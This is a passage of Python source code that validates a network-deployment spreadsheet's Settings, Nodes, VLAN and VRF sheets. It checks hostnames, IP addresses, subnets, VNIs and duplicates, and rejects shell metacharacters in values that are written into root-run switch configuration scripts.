    for k in sorted(settings.keys()):
        if k not in all_known_keys:
            result.warn("Settings",
                        f"Unknown key '{k}' — typo, or no consumer in the "
                        f"current pipeline. Documented keys: "
                        f"{', '.join(sorted(REQUIRED_SETTINGS_KEYS + OPTIONAL_SETTINGS_KEYS))}.")

    # SEC (scan finding #1): reject shell-injection vectors in Settings scalars
    # that render unquoted into root-executed config scripts. These structured
    # fields (hostnames, IPs, LDAP DNs, timezone) have no legitimate need for
    # shell metacharacters or control characters.
    # Newlines and commas are legitimate value separators for the multi-value
    # fields here (ntp_servers is one host per line; ldap_servers is CSV;
    # LDAP DNs use commas between RDNs), so we validate each token individually
    # rather than flagging the separator itself.
    for key in SHELL_INJECTION_PRONE_KEYS:
        val = settings.get(key)
        if val in (None, ''):
            continue
        for token in re.split(r'[\n,]', str(val)):
            token = token.strip()
            if not token:
                continue
            if len(token) > _MAX_SETTINGS_SCALAR_LEN:
                result.error("Settings",
                             f"'{key}' has a {len(token)}-character entry — exceeds "
                             f"the {_MAX_SETTINGS_SCALAR_LEN}-char limit. This value is "
                             f"rendered into a root-executed switch config; "
                             f"suspiciously long values are rejected.")
            m = _SHELL_META_RE.search(token)
            if m:
                result.error("Settings",
                             f"'{key}' entry {token!r} contains the disallowed "
                             f"character {m.group()!r}. This value is rendered "
                             f"unquoted into a root-executed config script, so shell "
                             f"metacharacters and control characters are rejected to "
                             f"prevent command injection.")

    return settings


def validate_nodes(ws, result, settings=None):
    """Validate Nodes sheet: required columns, IP formats, duplicates.

    Returns a list of dicts with parsed node data for cross-validation:
        [{'function': str, 'ip': str, 'prefix': int, 'gateway': str, 'row': int}, ...]
    """
    # Verify headers — required columns must be PRESENT, no silent fallback
    # to hardcoded column indices. Operators have deleted required columns
    # before; the fallback hid the mistake.
    headers = [_cell(ws, 1, c) for c in range(1, ws.max_column + 1)]
    required_headers = ['Function', 'Mgmt IP Address']
    missing_required = [h for h in required_headers if h not in headers]
    for h in missing_required:
        result.error("Nodes", f"Missing required column header: '{h}'")
    if missing_required:
        # Without the required headers we can't validate further — bail early
        return []

    # Find column indices from headers
    col_map = {}
    for c in range(1, ws.max_column + 1):
        h = _cell(ws, 1, c)
        if h:
            col_map[h] = c

    func_col = col_map.get('Function', NODE_COL_FUNCTION)
    name_col = col_map.get('Name', NODE_COL_NAME)
    mac_col = col_map.get('MAC Address for ZTP', NODE_COL_MAC)
    ip_col = col_map.get('Mgmt IP Address', NODE_COL_MGMT_IP)
    prefix_col = col_map.get('Prefix', NODE_COL_PREFIX)
    gateway_col = col_map.get('Gateway', NODE_COL_GATEWAY)
    oob_vlan_col = col_map.get('OOB VLAN')  # optional; not all sheets have it
    enabled_col = col_map.get('Enabled')  # optional, not all sheets have it
    type_col = col_map.get('Type')        # optional, new in 2026-05-28
    # Notes column ('Notes') is purely informational, no validator rules.

    functions_seen = []
    names_seen = []
    ips_seen = []
    parsed_nodes = []
    node_count = 0
    has_core = False
    arch = (settings or {}).get('architecture', '')
    enforcement = ROLE_ENFORCEMENT.get(arch, 'warn')
    non_canonical_funcs = []  # rolled up at end into one warn/error

    # When deploying in Air, switches get auto-assigned mgmt IPs — don't require them
    deploy_in_air = False
    if settings:
        deploy_in_air = str(settings.get('deploy_in_air', '')).strip().lower() in ('yes', 'true', '1')

    for row in range(2, ws.max_row + 1):
        func = _cell(ws, row, func_col)
        if func is None or str(func).strip() == '':
            continue

        # R4-13: warn on hidden rows. openpyxl preserves the row.hidden
        # flag; the parser ignores it and processes the row as if visible.
        # Operators hide rows to "remove" a host from the deploy; they get
        # it deployed anyway.
        rd = ws.row_dimensions.get(row)
        if rd is not None and rd.hidden:
            result.warn("Nodes",
                        f"Row {row} is hidden in Excel but has data — the "
                        f"parser will process it as if visible. To exclude "
                        f"a host, set Enabled=No (don't just hide the row).")

        node_count += 1
        func_str = str(func).strip()
        # N8: warn if Name is blank — the parser silently coerces hostname
        # to Function value, which can collide with other rows.
        raw_name = _cell(ws, row, name_col)
        if raw_name is None or not str(raw_name).strip():
            result.warn("Nodes",
                        f"Row {row}: Name is blank — parser will use "
                        f"Function value ('{func_str}') as hostname. "
                        f"Explicit Name avoids silent collisions.")
        name_str = str(raw_name or func_str).strip()

        # ERA-45: warn when the Name prefix implies a different role than the
        # Function. The Function stays AUTHORITATIVE (the parser trusts it) —
        # this only flags a likely-mislabeled row so the operator can check it.
        # Root-caused on an 8SU partner submission: gs-plane1-* (GPU spine) rows carried
        # Function gl-plane1 (GPU leaf), so the switches rendered as leaves and
        # were left unprovisioned. The cl/csl pair is exempt — the hostname
        # fallback can't distinguish a converged csl-/cl- name from the
        # dedicated 'cl' Function.
        _name_role = canonical_category('', name_str)
        _func_role = canonical_category(func_str, None)
        if (_name_role and _func_role and _name_role != _func_role
                and {_name_role, _func_role} != {'cl', 'csl'}):
            result.warn(
                "Nodes",
                f"Row {row}: {name_str} has Function '{func_str}' (role "
                f"{_func_role}) but its name implies role {_name_role}. The "
                f"Function is authoritative — if the name is correct, fix the "
                f"Function. A mislabeled spine/leaf or wrong plane leaves the "
                f"switch unprovisioned.")

        # T3/T4: reserved hostname collision. These names are sentinels
        # used by the topology generator (air-oob-switch is auto-injected
        # as the Air OOB bridge; outbound marks internet-link rows). A
        # user node with the same name silently overwrites / collides.
        # Exception: Enabled=Air documentary rows EXPECT these names —
        # they document the auto-injected infra rather than colliding
        # with it (validated separately above against _KNOWN_AIR_NODES).
        _RESERVED_NAMES = {'air-oob-switch', 'outbound', 'dhcp-oob',
                            'oob-server-01', 'dhcp-edge'}
        # Look ahead one cell to find the Enabled value early; the full
        # is_enabled / is_air_documentary computation happens below but
        # we need to suppress the reserved-names error here.
        _enabled_lookahead = (
            str(_cell(ws, row, enabled_col) or '').strip().lower()
            if enabled_col else ''
        )
        if name_str.lower() in _RESERVED_NAMES and _enabled_lookahead != 'air':
            result.error("Nodes",
                         f"Row {row}: Name '{name_str}' is reserved for "
                         f"Air-injected infrastructure. Either rename the "
                         f"row, or mark Enabled=Air to document the "
                         f"auto-injected entity rather than colliding "
                         f"with it.")

        # T11/T12: RFC1123 hostname format. Parser silently drops
        # invalid hostnames from topology JSON.
        if name_str:
            # R4-12: detect Unicode lookalikes / zero-width / emoji before
            # the generic message, since those look identical to plain
            # ASCII in the spreadsheet editor.
            invisible = {ch for ch in name_str if ord(ch) < 32 or ord(ch) == 127
                          or (0x200B <= ord(ch) <= 0x200F)
                          or ord(ch) == 0xFEFF}
            non_ascii = [ch for ch in name_str if ord(ch) > 127]
            if invisible:
                result.error("Nodes",
                             f"Row {row}: Name '{name_str}' contains invisible "
                             f"characters (codepoints "
                             f"{', '.join(f'U+{ord(c):04X}' for c in sorted(invisible))}). "
                             f"Likely pasted from a document; retype the name.")
            elif non_ascii:
                result.error("Nodes",
                             f"Row {row}: Name '{name_str}' contains non-ASCII "
                             f"characters ({''.join(non_ascii[:5])}). "
                             f"Hostnames must be ASCII letters/digits/hyphens "
                             f"(RFC1123); Cumulus, dnsmasq, and SSH all reject "
                             f"non-ASCII hostnames.")
            elif re.search(r'[^a-zA-Z0-9\-]', name_str):
                result.error("Nodes",
                             f"Row {row}: Name '{name_str}' contains invalid "
                             f"characters. Hostnames must be letters/digits/"
                             f"hyphens only (RFC1123). Spaces, slashes, dots, "
                             f"underscores all break topology generation.")
            elif name_str.isdigit():
                result.error("Nodes",
                             f"Row {row}: Name '{name_str}' is all-digit. "
                             f"RFC1123 requires at least one letter in a "
                             f"hostname label.")
            elif name_str.startswith('-') or name_str.endswith('-'):
                result.error("Nodes",
                             f"Row {row}: Name '{name_str}' starts or ends "
                             f"with a hyphen. RFC1123 disallows hyphens at "
                             f"label boundaries.")
            elif len(name_str) > 63:
                result.error("Nodes",
                             f"Row {row}: Name '{name_str}' exceeds 63 "
                             f"characters (RFC1123 max label length).")

        # Resolve to canonical category — accepts both canonical role
        # strings and legacy hostname-as-role values.
        category = canonical_category(func_str, name_str)
        is_switch_node = category in _SWITCH_CATEGORIES

        # Either core (collapsed) or csl (dedicated_gpu) satisfies the
        # "have at least one converged-fabric leaf" check.
        if category in _CONVERGED_LEAF_CATEGORIES:
            has_core = True

        # Step 3: per-arch role allow-list enforcement (docs/ROLES.md).
        # Accumulate hits; emit one rolled-up message per arch at the end.
        if func_str.lower() not in CANONICAL_ROLES:
            non_canonical_funcs.append((row, func_str))

        # Track for duplicate detection — Name must be unique per row;
        # Function may legitimately repeat when canonical roles are used.
        functions_seen.append((func_str, row))
        names_seen.append((name_str, row))

        # Enabled column is optional; default to enabled when missing/blank.
        # Allowed values: Yes / True / 1 / blank → enabled
        #                 No / False / 0         → disabled (skip provisioning)
        #                 Air                    → documentary (skip provisioning,
        #                                          row exists for operator awareness
        #                                          of auto-injected Air infra)
        enabled_val = _cell(ws, row, enabled_col) if enabled_col else None
        enabled_str = str(enabled_val or 'Yes').strip().lower()
        is_air_documentary = (enabled_str == 'air')
        is_enabled = enabled_str in ('yes', 'true', '1', '')

        # Type column rules (only when present in the sheet)
        type_val = ''
        if type_col:
            type_raw = _cell(ws, row, type_col)
            type_val = str(type_raw or '').strip().lower() if type_raw else ''
            # T1: Type value must be in the allowed set when populated
            if type_val and type_val not in _VALID_TYPES:
                result.error(
                    "Nodes",
                    f"Row {row} ({name_str}): Type '{type_val}' is not "
                    f"valid. Allowed: {sorted(_VALID_TYPES)}.")
                type_val = ''  # treat as missing for downstream checks

        if is_air_documentary:
            # T2: Enabled=Air rows must reference a known Air-only node.
            # This runs whether or not the Type column is present — a real
            # node typo'd (or copied) as Enabled=Air must not silently drop
            # out of provisioning on legacy (Type-less) Excels.
            expected_type = _KNOWN_AIR_NODES.get(name_str.lower())
            if expected_type is None and _CUST_NET_EDGE_RE.match(name_str.lower()):
                expected_type = 'switch'
            if expected_type is None:
                result.error(
                    "Nodes",
                    f"Row {row}: Enabled=Air but Name '{name_str}' is "
                    f"not a known Air-only node. Either rename the row "
                    f"or set Enabled=Yes/No. Known Air-only nodes: "
                    f"{', '.join(sorted(_KNOWN_AIR_NODES))}.")
            # T3: Air row's Type must match the known class (only checkable
            # when a Type was supplied).
            elif type_val and type_val != expected_type:
                result.error(
                    "Nodes",
                    f"Row {row}: Air-only node '{name_str}' is a "
                    f"{expected_type}, but Type='{type_val}'. Air "
                    f"auto-injects it as a {expected_type}; the row "
                    f"should match.")
        elif type_col:
            # T4: Function/Type consistency for Enabled=Yes/No rows
            # (only meaningful when a Type column exists).
            func_lower = func_str.lower()
            if type_val == 'switch' and func_lower in _NODE_FUNCTIONS:
                result.error(
                    "Nodes",
                    f"Row {row} ({name_str}): Function '{func_str}' is a "
                    f"server/node role but Type='switch'. Change Type "
                    f"to 'node' or pick a switch Function.")
            elif type_val == 'node' and func_lower in _SWITCH_FUNCTIONS:
                result.error(
                    "Nodes",
                    f"Row {row} ({name_str}): Function '{func_str}' is a "
                    f"switch role but Type='node'. Change Type to "
                    f"'switch' or pick a server/node Function.")

        # Arch-restricted Function values. A canonical role can still be
        # meaningless on the wrong arch (e.g. `csl` only exists in
        # dual-plane; `ext-storage` only has CSL templates emitting BGP
        # toward it). Catch these so operators don't silently misconfig.
        # Skip for Enabled=Air documentary rows — those are auto-injected
        # infra and may carry reserved roles regardless of arch (e.g.
        # cust-net-edge documentary with Function=edge on every arch).
        if (arch
                and not is_air_documentary
                and func_str.lower() in ARCH_RESTRICTED_FUNCTIONS
                and arch not in ARCH_RESTRICTED_FUNCTIONS[func_str.lower()]):
            valid_archs = sorted(ARCH_RESTRICTED_FUNCTIONS[func_str.lower()])
            result.error(
                "Nodes",
                f"Row {row} ({name_str}): Function '{func_str}' is only "
                f"valid on arch(s) {valid_archs}; current arch is '{arch}'. "
                f"Switch templates for '{arch}' don't peer with this role — "
                f"the deploy would silently leave it inert."
            )

        node_data = {'function': func_str, 'name': name_str, 'row': row,
                     'ip': None, 'prefix': None, 'gateway': None,
                     'enabled': is_enabled,
                     'is_air_documentary': is_air_documentary,
                     'oob_vlan': ''}

        # OOB VLAN — mirrors excel_parser.py's parse_nodes: normalise to a
        # bare id string ('201'), tolerating floats from Excel (201.0).
        # Feeds resolve_oob_vlans() for the cross-sheet OOB VLAN guardrails.
        if oob_vlan_col:
            oob_vlan_raw = _cell(ws, row, oob_vlan_col)
            if oob_vlan_raw is None or str(oob_vlan_raw).strip() == '':
                node_data['oob_vlan'] = ''
            elif isinstance(oob_vlan_raw, float) and oob_vlan_raw.is_integer():
                node_data['oob_vlan'] = str(int(oob_vlan_raw))
            else:
                node_data['oob_vlan'] = str(oob_vlan_raw).strip()

        # Mgmt IP — optional for switches in Air deployments (auto-assigned).
        # Also optional for ext-storage (customer-side simulated aggregate;
        # has no OOB cabling, Mgmt IP not meaningful — see canonical role)
        # and for any Enabled=Air documentary row (auto-injected infra).
        # Use raw cell access for the whitespace check; _cell() strips.
        ip_raw_cell = ws.cell(row=row, column=ip_col).value
        ip = _cell(ws, row, ip_col)
        if ip is None or str(ip).strip() == '':
            is_ext_storage = canonical_category(func_str, name_str) == 'ext-storage'
            if (not (deploy_in_air and is_switch_node)
                    and not is_ext_storage
                    and not is_air_documentary):
                result.error("Nodes", f"Row {row} ({func_str}): Missing management IP")
        else:
            ip_str = str(ip).strip()
            # N4: warn if surrounding whitespace in the raw cell; parser
            # writes raw value downstream so dnsmasq lines and ansible_host
            # get malformed.
            if isinstance(ip_raw_cell, str) and ip_raw_cell != ip_str:
                result.warn("Nodes",
                            f"Row {row} ({func_str}): Mgmt IP cell has leading/"
                            f"trailing whitespace ({ip_raw_cell!r}); the parser "
                            f"writes the raw value to dnsmasq + ansible_host, "
                            f"which will be malformed.")
            if not _is_valid_ip(ip_str):
                # R4-14: hint when operator put CIDR in the IP column — the
                # mgmt-IP column is the host part only; prefix goes in the
                # Prefix column.
                hint = ""
                if '/' in ip_str and _is_valid_cidr(ip_str):
                    host_part = ip_str.split('/')[0]
                    prefix_part = ip_str.split('/')[1]
                    hint = (f" Put '{host_part}' in the Mgmt IP column and "
                            f"'/{prefix_part}' in the Prefix column.")
                result.error("Nodes", f"Row {row} ({func_str}): Invalid IP address: '{ip_str}'.{hint}")
            elif ip_str in ('0.0.0.0', '255.255.255.255') or ip_str.startswith('127.'):
                # N3: reserved addresses produce broken NVUE + ansible_host
                result.error("Nodes",
                             f"Row {row} ({func_str}): Mgmt IP '{ip_str}' is a "
                             f"reserved address (0.0.0.0, 127.x.y.z, or broadcast); "
                             f"produces broken DHCP reservations and ansible_host SSH.")
            else:
                ips_seen.append((ip_str, row, func_str))
                node_data['ip'] = ip_str

        # Prefix — N5: /0 is invalid (whole IPv4 space); ranges 1-32 only.
        prefix = _cell(ws, row, prefix_col)
        if prefix is not None:
            try:
                p = int(prefix)
                if p < 1 or p > 32:
                    result.error("Nodes",
                                 f"Row {row} ({func_str}): Prefix out of range: {p} "
                                 f"(must be 1-32; /0 covers the whole IPv4 space "
                                 f"and is silently dropped from generated config).")
                else:
                    node_data['prefix'] = p
            except (TypeError, ValueError):
                result.error("Nodes", f"Row {row} ({func_str}): Invalid prefix: '{prefix}'")

        # Gateway
        gw = _cell(ws, row, gateway_col)
        if gw is not None and str(gw).strip():
            gw_str = str(gw).strip()
            if not _is_valid_ip(gw_str):
                result.error("Nodes", f"Row {row} ({func_str}): Invalid gateway: '{gw}'")
            else:
                node_data['gateway'] = gw_str

        # Gateway within node's own subnet
        # This is a warning, not an error — in ERA multi-subnet mgmt designs,
        # the OOB server on the first subnet acts as a router, so nodes on
        # other subnets may legitimately use a gateway from a different subnet.
        if node_data['ip'] and node_data['prefix'] and node_data['gateway']:
            try:
                node_net = ipaddress.IPv4Network(
                    f"{node_data['ip']}/{node_data['prefix']}", strict=False)
                gw_addr = ipaddress.IPv4Address(node_data['gateway'])
                if gw_addr not in node_net:
                    result.warn("Nodes",
                                f"Row {row} ({func_str}): Gateway {node_data['gateway']} "
                                f"is outside node subnet {node_net}")
            except ValueError:
                pass  # Already reported above

        # MAC
        mac = _cell(ws, row, mac_col)
        if mac is not None and str(mac).strip():
            if not MAC_RE.match(str(mac).strip()):
                result.error("Nodes", f"Row {row} ({func_str}): Invalid MAC format: '{mac}'")

        parsed_nodes.append(node_data)

    # Step 3 rollup: one message summarising every non-canonical Function
    # cell, with severity per ROLE_ENFORCEMENT for this arch.
    if non_canonical_funcs:
        rows_str = ', '.join(str(r) for r, _ in non_canonical_funcs[:8])
        if len(non_canonical_funcs) > 8:
            rows_str += f', ... ({len(non_canonical_funcs)} total)'
        distinct_examples = sorted({v for _, v in non_canonical_funcs})[:6]
        msg = (f"{len(non_canonical_funcs)} Function cell(s) hold non-canonical "
               f"role values (see docs/ROLES.md). Rows: {rows_str}. "
               f"Examples: {distinct_examples}.")
        if enforcement == 'strict':
            result.error("Nodes", msg)
        else:
            result.warn("Nodes", msg)

    # Must have at least the converged-fabric leaf pair
    # (core/core for collapsed designs; csl/csl for dedicated_gpu).
    if not has_core:
        result.error("Nodes", "No converged-fabric leaf switches found (need at least core or csl in Function column)")

    # Check node count
    if node_count == 0:
        result.error("Nodes", "No nodes found — sheet appears empty")

    # Duplicate Name — every row must have a unique hostname. When Function
    # is canonical, multiple rows legitimately share the same Function value
    # (e.g. two csl rows both with Function='csl'), so uniqueness moves to
    # the Name column. Legacy hostname-as-role inputs continue to detect
    # collisions here because Name typically equals Function.
    name_counts = Counter(n for n, _ in names_seen)
    for n, count in name_counts.items():
        if count > 1:
            rows = [r for nn, r in names_seen if nn == n]
            result.error("Nodes", f"Duplicate Name '{n}' on rows: {rows}")

    # Duplicate Function: only flagged for non-canonical values (canonical
    # repeats are expected post-step-4; hostname-as-role repeats indicate
    # the operator pasted the same hostname twice).
    func_counts = Counter(f for f, _ in functions_seen)
    for func_name, count in func_counts.items():
        if count > 1 and func_name.lower() not in CANONICAL_ROLES:
            rows = [r for f, r in functions_seen if f == func_name]
            result.error("Nodes", f"Duplicate function name '{func_name}' on rows: {rows}")

    # Duplicate IPs
    ip_counts = Counter(ip for ip, _, _ in ips_seen)
    for ip_addr, count in ip_counts.items():
        if count > 1:
            entries = [(r, f) for ip, r, f in ips_seen if ip == ip_addr]
            result.error("Nodes", f"Duplicate management IP '{ip_addr}' used by: {entries}")

    return parsed_nodes


def validate_vlans(ws, result):
    """Validate VLANs & Profiles sheet: VLAN section integrity.

    Returns a list of parsed VLAN dicts for cross-validation:
        [{'id': int, 'name': str, 'subnet': str, 'gateway': str, 'network': IPv4Network, 'row': int}, ...]
    """
    # Check header row
    header_row2 = _cell(ws, 2, 1)
    if header_row2 != 'VLAN ID':
        result.warn("VLANs & Profiles", f"Expected 'VLAN ID' header in row 2 col 1, got: '{header_row2}'")

    # Dynamic column lookup for optional columns (DHCP Relay Client lives
    # past the fixed positions and is read by name from the header).
    # Multi-line headers permitted (operator help text on second line).
    header_cols = {}
    for c in range(1, ws.max_column + 1):
        h = _cell(ws, 2, c)
        if h:
            first_line = str(h).splitlines()[0].strip()
            header_cols[first_line.lower().replace(' ', '_')] = c
    dhcp_relay_client_col = header_cols.get('dhcp_relay_client')

    vlan_ids = []
    vlan_names = []
    parsed_vlans = []

    # Parse VLAN rows (start row 3, end when col 1 is empty or non-integer)
    for row in range(3, ws.max_row + 1):
        vlan_id = _cell(ws, row, 1)
        if vlan_id is None:
            break
        # Strict type check: the parser only treats integer cells as
        # VLAN rows. Text-typed cells (`"900"`) or float-typed cells
        # (`900.5`) get silently dropped from the inventory. Fail loudly
        # so operators don't get their VLAN deleted without warning.
        if isinstance(vlan_id, bool):
            # `bool` is technically `int`-typed in Python; reject up front
            result.error("VLANs & Profiles",
                         f"Row {row}: VLAN ID is a boolean ({vlan_id}). "
                         f"Use an integer between 1 and 4094.")
            continue
        if not isinstance(vlan_id, int):
            # Distinguish text-typed cell (silently dropped by parser)
            # from a non-VLAN section row (intentional end-of-section).
            vlan_id_str = str(vlan_id).strip()
            if vlan_id_str and vlan_id_str.lower() not in (
                    'vrfs', 'port profiles', 'dhcp relay', 'vlan id'):
                # Looks like an intended VLAN ID but the wrong type
                try:
                    coerced = int(vlan_id_str)
                    result.error("VLANs & Profiles",
                                 f"Row {row}: VLAN ID '{vlan_id}' is text-"
                                 f"typed (Excel column format = Text). Parser "
                                 f"requires integer-typed cells; this row would "
                                 f"be silently dropped. Re-enter as an integer "
                                 f"({coerced}) or change the cell format to Number.")
                except ValueError:
                    pass  # genuinely not a VLAN ID; let the break fire
            break  # Hit the VRFs section or something else

        name = _cell(ws, row, 2)
        subnet = _cell(ws, row, 4)
        gateway = _cell(ws, row, 5)
        vrf = _cell(ws, row, 6)

        vlan_ids.append((vlan_id, row))
        vlan_data = {'id': vlan_id, 'name': str(name).strip() if name else '',
                     'subnet': None, 'gateway': None, 'network': None,
                     'vrf': str(vrf).strip() if vrf else '',
                     'dhcp_relay_client': '',
                     'row': row}

        if dhcp_relay_client_col:
            raw_client = _cell(ws, row, dhcp_relay_client_col)
            vlan_data['dhcp_relay_client'] = str(raw_client).strip() if raw_client else ''

        if name:
            vlan_names.append((str(name).strip(), row))

        # VLAN ID range
        if vlan_id < 1 or vlan_id > 4094:
            result.error("VLANs & Profiles", f"Row {row}: VLAN ID {vlan_id} out of valid range (1-4094)")

        # Subnet
        if subnet and str(subnet).strip():
            subnet_str = str(subnet).strip()
            if not _is_valid_cidr(subnet_str):
                result.error("VLANs & Profiles", f"Row {row} (VLAN {vlan_id}): Invalid subnet: '{subnet}'")
            else:
                vlan_data['subnet'] = subnet_str
                try:
                    vlan_data['network'] = ipaddress.IPv4Network(subnet_str, strict=False)
                    # R3-15: subnet prefix sanity. /0-/15 is way too broad
                    # (operator typo — switch will originate huge ranges into
                    # BGP). /31-/32 is too narrow for an SVI with VRR.
                    prefix = vlan_data['network'].prefixlen
                    if prefix < 16:
                        result.error("VLANs & Profiles",
                                     f"Row {row} (VLAN {vlan_id}): subnet "
                                     f"{subnet_str} has prefix /{prefix} which "
                                     f"is too broad ({vlan_data['network'].num_addresses} "
                                     f"addresses). Likely a typo. Switches "
                                     f"will originate this into BGP, "
                                     f"blackholing routes.")
                    elif prefix >= 31:
                        # R3-14: /31 and /32 SVIs are problematic with VRR.
                        # /31 has 2 addresses (no broadcast/network), can't
                        # fit a VRR anycast gateway + per-switch IPs.
                        result.error("VLANs & Profiles",
                                     f"Row {row} (VLAN {vlan_id}): subnet "
                                     f"{subnet_str} has prefix /{prefix} which "
                                     f"can't fit a VRR anycast gateway plus "
                                     f"per-switch SVI IPs. Use /24-/30.")
                except ValueError:
                    pass
        else:
            result.warn("VLANs & Profiles", f"Row {row} (VLAN {vlan_id}): No subnet defined")

        # Gateway
        if gateway and str(gateway).strip():
            gw_str = str(gateway).strip()
            if not _is_valid_ip(gw_str):
                result.error("VLANs & Profiles", f"Row {row} (VLAN {vlan_id}): Invalid gateway: '{gw_str}'")
            else:
                vlan_data['gateway'] = gw_str

        # Gateway within VLAN subnet
        if vlan_data['network'] and vlan_data['gateway']:
            gw_addr = ipaddress.IPv4Address(vlan_data['gateway'])
            if gw_addr not in vlan_data['network']:
                result.error("VLANs & Profiles",
                             f"Row {row} (VLAN {vlan_id}): Gateway {vlan_data['gateway']} "
                             f"is outside VLAN subnet {vlan_data['network']}")

        parsed_vlans.append(vlan_data)

    if not vlan_ids:
        result.error("VLANs & Profiles", "No VLANs found")

    # Duplicate VLAN IDs — allowed when all duplicates are plane-suffixed
    # names (e.g. gpu_plane1 + gpu_plane2 sharing VLAN 900). Planes are
    # physically separate L2 broadcast domains, so reusing the tag is fine.
    row_to_name = {row: name for name, row in vlan_names}
    plane_pat = re.compile(r'^.+_plane\d+$', re.IGNORECASE)
    id_counts = Counter(vid for vid, _ in vlan_ids)
    for vid, count in id_counts.items():
        if count > 1:
            rows = [r for v, r in vlan_ids if v == vid]
            names = [row_to_name.get(r, '') for r in rows]
            if (all(plane_pat.match(n or '') for n in names)
                    and len(set(names)) == count):
                continue  # per-plane duplicate — legitimate
            result.error("VLANs & Profiles", f"Duplicate VLAN ID {vid} on rows: {rows}")

    # Duplicate VLAN names
    name_counts = Counter(n.lower() for n, _ in vlan_names)
    for name, count in name_counts.items():
        if count > 1:
            rows = [r for n, r in vlan_names if n.lower() == name]
            result.error("VLANs & Profiles", f"Duplicate VLAN name '{name}' on rows: {rows}")

    # Overlapping subnets
    nets = [(v['id'], v['network'], v['row']) for v in parsed_vlans if v['network']]
    for i in range(len(nets)):
        for j in range(i + 1, len(nets)):
            vid_a, net_a, row_a = nets[i]
            vid_b, net_b, row_b = nets[j]
            if net_a.overlaps(net_b):
                result.error("VLANs & Profiles",
                             f"Overlapping subnets: VLAN {vid_a} ({net_a}, row {row_a}) "
                             f"overlaps with VLAN {vid_b} ({net_b}, row {row_b})")

    # Subnet host bits — strict=False normalizes typos silently. Re-check
    # with strict=True and warn if the operator's input differs from the
    # canonical network address.
    for vlan_id, row, vlan_data in [(v['id'], v['row'], v) for v in parsed_vlans]:
        if not vlan_data.get('subnet') or not vlan_data.get('network'):
            continue
        original = vlan_data['subnet']
        try:
            ipaddress.IPv4Network(original, strict=True)
        except ValueError:
            result.error("VLANs & Profiles",
                         f"Row {row} (VLAN {vlan_id}): subnet '{original}' has "
                         f"host bits set (e.g. typo: should be a network address "
                         f"like '192.168.1.0/24', not '192.168.1.5/24'). The "
                         f"parser silently strips host bits, hiding typos.")

    # VNI uniqueness — duplicate VNIs cause bridge collisions at apply time,
    # EXCEPT across plane-suffixed VLANs (e.g. gpu_plane1 + gpu_plane2 sharing
    # one VNI on VLAN 900). Rail-optimized GPU planes own disjoint switch sets,
    # so the VLAN ID is locally significant to each and the shared VNI never
    # collides. Mirrors the duplicate-VLAN-ID plane exemption above.
    #
    # The shipped workbooks do NOT actually share: the arch models set
    # east_west.plane_vni_stride = 1, so plane1 VLAN 900 is VNI 4900 and plane2
    # is 4901. The exemption exists because sharing is equally valid and is what
    # the reference configs do — release/REFERENCES/2-8-9-800/configs/
    # gsl-plane{1,2}-*.sh carry `vlan 900 vni 289900` on all four leaves, and
    # `vrf GPU evpn vni 289003` is already shared across planes today. Setting
    # the stride to 0 selects that numbering, at which point this exemption
    # becomes load-bearing rather than merely permissive.
    _vni_plane_pat = re.compile(r'^.+_plane\d+$', re.IGNORECASE)
    # VXLAN VNI is a 24-bit field (RFC 7348): 1 .. 2**24 - 1. Out-of-range values
    # parse fine here but are rejected by NVUE at `nv config apply`, which is a
    # far worse place to discover a typo.
    _VNI_MAX = 2 ** 24 - 1
    vni_col = header_cols.get('vni')
    if vni_col:
        vni_seen = {}
        for v in parsed_vlans:
            vni_raw = _cell(ws, v['row'], vni_col)
            if vni_raw is None:
                continue
            try:
                vni = int(vni_raw)
            except (TypeError, ValueError):
                continue
            if not 1 <= vni <= _VNI_MAX:
                result.error("VLANs & Profiles",
                             f"VNI {vni} on row {v['row']} is outside the valid "
                             f"VXLAN range 1-{_VNI_MAX} (24-bit, RFC 7348). "
                             f"NVUE rejects it at `nv config apply`.")
                continue
            is_plane = bool(_vni_plane_pat.match(v.get('name') or ''))
            if vni in vni_seen:
                other_row, other_plane = vni_seen[vni]
                if is_plane and other_plane:
                    continue  # isolated GPU planes may share a VNI
                result.error("VLANs & Profiles",
                             f"Duplicate VNI {vni} on rows {other_row} and "
                             f"{v['row']}. VNIs must be unique — overlapping "
                             f"VNIs cause bridge-domain collisions at apply time.")
            else:
                vni_seen[vni] = (v['row'], is_plane)

    # Required-VLAN gating: warn if any VLAN row is missing a subnet
    # (treated as error elsewhere via the SVI side, but the row itself
    # currently only warns — promote to error since dropping the SVI is
    # a silent failure).
    for v in parsed_vlans:
        if not v.get('subnet'):
            result.error("VLANs & Profiles",
                         f"Row {v['row']} (VLAN {v['id']}): subnet is required. "
                         f"Without a subnet, the generated config has no SVI "
                         f"for this VLAN (silent failure).")

    # R3-8: `gpu_plane_<N>` (underscore-digit) silently dropped by parser.
    # Operator likely meant `gpu_plane<N>` (no underscore). Warn.
    for v in parsed_vlans:
        name = (v.get('name') or '').strip().lower()
        m_bad = re.match(r'^gpu(_plane|_rail)_\d+', name)
        m_good_plane = re.match(r'^gpu_plane\d+$', name)
        m_good_rail = re.match(r'^gpu_rail\d+(_plane\d+)?$', name)
        if m_bad and not (m_good_plane or m_good_rail):
            # underscore between word and digit (e.g., `gpu_plane_1`)
            result.warn("VLANs & Profiles",
                        f"VLAN row {v['row']} '{v['name']}': name uses "
                        f"underscore-before-digit (e.g., `gpu_plane_1`); "
                        f"parser convention is `gpu_plane1` / `gpu_rail1` "
                        f"(no underscore between word and digit). This row "
                        f"is silently ignored by the parser.")

    return parsed_vlans


def validate_vrfs_section(ws, parsed_vlans, result):
    """Validate the VRFs section of VLANs & Profiles.

    Rules:
      - VRF Name must be unique (duplicates silently overwrite in parser)
      - L3 VNI must be a positive integer (text/0 crashes generate or
        silently drops the VRF block from generated config)
      - L3 VNI must not collide with any VLAN's VNI
    """
    # Find the VRFs section header
    vrfs_header_row = None
    for row in range(1, ws.max_row + 1):
        val = ws.cell(row=row, column=1).value
        if val and str(val).strip() == 'VRFs':
            vrfs_header_row = row
            break
    if vrfs_header_row is None:
        return  # no VRFs section; skip

    # Data rows start 2 after header (skip column-name row)
    seen_vrfs = {}
    vrf_l3_vnis = {}
    for row in range(vrfs_header_row + 2, ws.max_row + 1):
        name = ws.cell(row=row, column=1).value
        if name is None:
            continue
        name_str = str(name).strip()
        if not name_str or name_str in ('Port Profiles', 'DHCP Relay'):
            break  # end of section

        # Duplicate name?
        if name_str in seen_vrfs:
            result.error("VLANs & Profiles",
                         f"VRFs section row {row}: duplicate VRF name "
                         f"'{name_str}' (also on row {seen_vrfs[name_str]}). "
                         f"Parser silently overwrites the earlier definition; "
